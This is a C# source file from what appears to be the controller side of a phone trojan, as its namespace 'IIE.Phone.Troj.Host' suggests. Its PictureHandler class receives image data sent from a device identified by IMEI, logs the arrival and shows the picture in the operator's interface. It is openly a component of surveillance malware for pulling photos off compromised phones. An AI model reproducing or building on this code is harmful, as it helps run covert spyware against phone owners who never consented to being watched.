﻿using InOut;
using InOut.PacketImp;

namespace IIE.Phone.Troj.Host.Handler
{
    public class PictureHandler : IPacketHandler
    {
        private readonly IMainView gui;
        private readonly int channel;
        private readonly string imei;

        public PictureHandler(int chan, string imei, IMainView gui)
        {
            channel = chan;
            this.imei = imei;
            this.gui = gui;
        }


        public void Receive(IPacket p, string tempIMEI)
        {


        }


        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            gui.Log.LogTxt("Image data has been received");
            c.ChannelHandlerMap[imei].RemoveListener(channel);
            var packet = (RawPacket)p;
            gui.UpdateUserPicture(imei, packet.Data);
        }
    }
}
